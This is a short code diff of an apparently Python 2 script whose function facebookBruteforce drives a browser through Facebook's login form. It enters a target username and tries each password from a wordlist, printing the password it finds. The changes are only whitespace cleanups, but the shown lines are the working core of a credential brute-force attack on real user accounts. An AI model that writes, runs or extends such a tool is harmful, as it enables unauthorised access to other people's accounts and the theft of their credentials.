@@ -33,7 +33,7 @@ def facebookBruteforce(username, wordlist, delay):
         try:
             elem = driver.find_element_by_name("email")
             elem.clear()
-            elem.send_keys(username)    
+            elem.send_keys(username)
             elem = driver.find_element_by_name("pass")
             elem.clear()
             elem.send_keys(password)
@@ -44,6 +44,6 @@ def facebookBruteforce(username, wordlist, delay):
         except AssertionError:
             print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
             sys.exit(0)
-        except Exception, e :
+        except Exception, e:
             print R + "[!] OOPs, something went wrong. Did you terminate the connection? [!]" + W
             sys.exit(1)
